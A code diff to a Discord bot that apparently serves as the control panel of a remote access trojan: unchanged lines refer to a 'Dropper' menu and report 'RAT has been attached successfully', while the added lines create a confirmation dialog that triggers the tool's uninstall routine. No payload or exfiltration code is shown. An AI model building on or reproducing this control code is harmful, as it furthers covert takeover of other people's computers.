@@ -9,6 +9,28 @@ import time
 from core.logEntry import log_entries
 from helpers.attach import *
 from helpers.network import Network
+from helpers.uninstall import uninstall
+
+class confirm(discord.ui.View):
+  def __init__(self):
+      super().__init__(timeout=None)
+         
+  @discord.ui.button(label=f'yes im sure (delete)', style=discord.ButtonStyle.red, row=1, disabled=False)
+  async def yes(self, interaction: discord.Interaction, button: discord.ui.Button):  
+       try:
+            await interaction.response.edit_message(content="bye.", embed=None, view=None)
+            uninstall(True)
+       except Exception as e:
+          logger.error(e)
+          
+  @discord.ui.button(label=f'no', style=discord.ButtonStyle.gray, row=1, disabled=False)
+  async def hellno(self, interaction: discord.Interaction, button: discord.ui.Button):  
+       try:
+            await interaction.message.delete()
+       except Exception as e:
+          logger.error(e)        
+
+
 
 def home():
     embed = discord.Embed(
@@ -138,9 +160,13 @@ class Dropper(discord.ui.Select):
                 embed = discord.Embed(title="Success", description=f"RAT has been attached successfully", color=config.embedcolor)  
               else:  
                 embed = discord.Embed(title="Attach failed", description=f"RAT has failed to attach\n> Error: `{mm}`", color=config.embederrorcolor) 
-              await msg.edit(embed=embed, view=Dropperview())                  
+              await msg.edit(embed=embed, view=Dropperview())         
+          elif so == "remove":
+              embed = discord.Embed(description=f"⭕ | ARE YOU 100% sure??", color=discord.Color.orange())  
+              await interaction.response.send_message(embed=embed, view=confirm())           
           else:
               await interaction.response.send_message("soon inshallah", ephemeral=True)     
+              
                      
         except Exception as e:
             await Bot.error(interaction, Bot, e)
